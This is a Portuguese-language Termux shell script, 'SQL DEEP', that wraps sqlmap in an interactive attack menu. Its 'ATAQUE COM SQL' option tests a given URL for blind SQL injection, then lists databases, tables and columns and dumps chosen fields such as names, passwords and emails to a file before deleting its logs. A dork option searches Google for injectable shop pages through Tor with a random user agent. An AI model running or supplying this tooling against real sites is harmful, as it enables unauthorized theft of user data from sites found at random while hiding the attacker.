#!/data/data/com.termux/files/usr/bin/bash
x="teste"
menu()
{
while true $x !="teste"
do
echo "╔═╗╔═╗ ╦    ╔╦╗╔═╗╔═╗╔═╗";
echo "╚═╗║═╬╗║     ║║║╣ ║╣ ╠═╝";
echo "╚═╝╚═╝╚╩═╝  ═╩╝╚═╝╚═╝╩  ";
echo "========================"
echo "1)ATAQUE COM SQL"
echo "2)PESQUISA DORK(BETA)"
echo "3)INFORME A PASTA DO SQLMAP"
echo "4) SAIR"
echo "========================"
echo ""
echo "OQUE VOCE QUER FAZER"
read x
echo "VOCE SELECIONOU ($x)"
case "$x" in
1)
echo "======================"
clear
echo "Informe um site/url"
echo "======================"
echo ""
echo "exemplo: http://testphp.vulnweb.com/listproducts.php?cat=1"
read site
echo "nome do arquivo da lista"
read lista
python2  sqlmap.py -u"$site" --dbs | tee -a ls-$lista.txt
clear
echo "testando site"
list2=$(grep "boolean-based" ls-$lista.txt )
echo "testando site com sql deep by one deep script"
list="    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause"
echo "($list)tem que ser igual a ($list2)"
if [ "$list2" = "$list" ]; then
read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
clear
echo "site com falha de sql..."
tail -n 16 ls-$lista.txt
sleep 1
echo "NOME DA COLUMA QUE VOCE QUER PEGA:"
read COLUMA
read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
clear
echo "pegando dados da ($COLUMA)"
python2 sqlmap.py -u"$site" --dbs -D $COLUMA --tables
echo "NOME DA TABELAS QUE VOCE QUER: "
read TABELAS
read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
clear
echo "pegando dados da ($TABELAS)"
python2 sqlmap.py -u"$site" --dbs -D $COLUMA --tables -T $TABELAS --columns
echo "EX: name,pass,uname,email"
echo "NOME DO INFORMACAO QUE VOCE QUER: "
read INFORMACAO
echo "nome do dados para os arquivos?"
echo "nome da pasta aonde salvar a logo de dados?"
read dados
read pasta
read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
clear
echo "pegando dados da ($INFORMACAO)"
python2 sqlmap.py -u"$site" --dbs -D $COLUMA --tables -T $TABELAS --columns -C $INFORMACAO --dump | tee -a >> $pasta/logo-$dados.txt
read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
clear
echo "pegando dados"
clear
read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
clear
echo "infromacao do site a abaixo"
tail -n 16 logo-$dados.txt
read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
rm -r ls-$lista.txt
rm -rf *.txt
echo "voltando para menu"
sleep 2
echo "==========================================================="
else
    echo "apagando logs"
	rm -r ls-$lista.txt
    rm -rf *.txt
    echo "site sem falhas de sql"
	read -p "Pressione [Enter] para continuar ou CTRL+C para sair..."
	echo "voltando para o menu"
	sleep 1
fi
;;
2)
echo "================="
echo "Informe sua dork"
echo "================="
echo "EX: addToCart.php?idProduct="
read dork
echo "Nome do txt com os sites"
read txt
echo "ex: /sdcard obs:permicao para acessar arquivos no termux"
echo "aonde salvar ele?"
read salvar
clear
python2 sqlmap.py -g "$dork" –random-agent –tor-type=SOCKS5 | tee -a $salvar/dork-$txt.txt
clear
sleep 1
;;
3)
echo "======================"
echo "Aonde esta o SQLMAP:"
echo "EX: no termux /data/data/com.termux/files/home/sqlmap"
read pasta
cd $pasta
dir=$pasta
if [ -e "$dir" ] ; then
echo "o diretório existe"
echo "Voltando para Menu"
else
echo "o diretório não existe"
fi
sleep 2
clear
;;
4)
 echo "saindo..."
 sleep 2
 clear;
 exit;
;;
*)
echo "Opção inválida!"
esac
done

}
menu